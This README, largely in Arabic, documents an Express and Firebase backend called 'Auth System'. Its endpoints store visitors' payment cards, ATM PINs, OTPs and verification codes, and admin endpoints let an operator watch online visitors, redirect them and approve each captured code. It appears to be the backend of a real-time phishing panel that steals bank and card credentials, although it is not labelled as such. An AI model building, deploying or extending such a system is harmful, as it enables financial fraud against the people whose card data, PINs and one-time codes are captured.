# Auth System Backend - Express + Firebase

Backend API مبني على Express.js مع Firebase Admin SDK.

## 🚀 التشغيل المحلي

```bash
# تثبيت المكتبات
npm install

# تشغيل Server
npm start

# Development mode (مع nodemon)
npm run dev
```

## 📁 البنية

```
backend/
├── server.js           # Main server file
├── firebase-config.js  # Firebase initialization
├── admin-api.js        # Admin APIs
├── sys-track.js        # Visitor tracking
├── data-save.js        # Data saving utilities
├── public/             # Static files
└── package.json
```

## 🔧 Environment Variables

إنشاء ملف `.env`:

```env
PORT=5000
FIREBASE_PROJECT_ID=your-project-id
FIREBASE_CLIENT_EMAIL=your-client-email@your-project.iam.gserviceaccount.com
FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n"
FRONTEND_URL=http://localhost:3000
```

### الحصول على Firebase Credentials

1. افتح [Firebase Console](https://console.firebase.google.com/)
2. اختر مشروعك
3. Project Settings → Service Accounts
4. Generate New Private Key
5. انسخ المعلومات من ملف JSON:
   - `project_id` → `FIREBASE_PROJECT_ID`
   - `client_email` → `FIREBASE_CLIENT_EMAIL`
   - `private_key` → `FIREBASE_PRIVATE_KEY`

## 📦 المكتبات المستخدمة

- **Express** - Web framework
- **Firebase Admin SDK** - Database & Auth
- **CORS** - Cross-origin requests
- **Cookie Parser** - Cookie handling
- **dotenv** - Environment variables

## 🔌 API Endpoints

### Public APIs

#### Visitor Management
- `POST /api/visitor/online` - تحديث حالة الاتصال
- `POST /api/visitor/offline` - تحديث حالة عدم الاتصال
- `GET /api/check-redirect` - التحقق من إعادة التوجيه

#### Data Saving
- `POST /api/save-field` - حفظ حقل واحد
- `POST /api/save-payment` - حفظ معلومات الدفع
- `POST /api/save-otp` - حفظ OTP
- `POST /api/save-atm-pin` - حفظ ATM PIN
- `POST /api/save-activation-data` - حفظ بيانات التفعيل
- `POST /api/save-verification-code` - حفظ رمز التحقق

#### Status Checking
- `GET /api/check-payment-approval` - التحقق من موافقة الدفع
- `GET /api/check-otp-approval` - التحقق من موافقة OTP
- `GET /api/check-verification-approval` - التحقق من موافقة التحقق

### Admin APIs

- `GET /api/admin/visitors` - جلب جميع الزوار
- `GET /api/admin/visitor/:vid` - جلب زائر محدد
- `GET /api/admin/visitors/online` - جلب الزوار المتصلين
- `GET /api/admin/statistics` - الإحصائيات
- `POST /api/admin/redirect-visitor` - إعادة توجيه زائر
- `POST /api/admin/approve-payment` - الموافقة على الدفع
- `POST /api/admin/approve-otp` - الموافقة على OTP
- `POST /api/admin/approve-verification` - الموافقة على التحقق

## 🗄️ Firebase Structure

```
visitors/
  {vid}/
    status:
      online: boolean
      lastSeen: timestamp
    data:
      step1: {...}
      step3: {...}
    payment:
      current: {...}
      history: {...}
      card_status: "pending" | "approved" | "rejected"
    otp:
      current: {...}
      history: {...}
      otp_status: "pending" | "approved" | "rejected"
    atmPin:
      current: {...}
      history: {...}
    activation:
      current: {...}
      history: {...}
    verification:
      current: {...}
      history: {...}
      verification_status: "pending" | "approved" | "rejected"
```

## 🔐 CORS Configuration

CORS محدود للـ origins التالية:
- `http://localhost:3000` (Development)
- `https://auth-system-nextjs.vercel.app` (Production)
- `process.env.FRONTEND_URL` (Custom)

## 🚀 النشر

### Render

1. أنشئ Web Service جديد
2. اربط GitHub repo
3. أضف Environment Variables
4. Deploy!

### Railway

1. أنشئ مشروع جديد
2. اربط GitHub repo
3. أضف Environment Variables
4. Deploy!

### Vercel (Serverless)

1. أضف `vercel.json`:
```json
{
  "version": 2,
  "builds": [
    {
      "src": "server.js",
      "use": "@vercel/node"
    }
  ],
  "routes": [
    {
      "src": "/(.*)",
      "dest": "server.js"
    }
  ]
}
```

2. Deploy على Vercel

## 📝 ملاحظات

- جميع البيانات تُحفظ في Firebase Firestore
- يتم تتبع جميع المحاولات في `history`
- Visitor ID يُحفظ في Cookie
- التحديثات الفورية تتم عبر polling
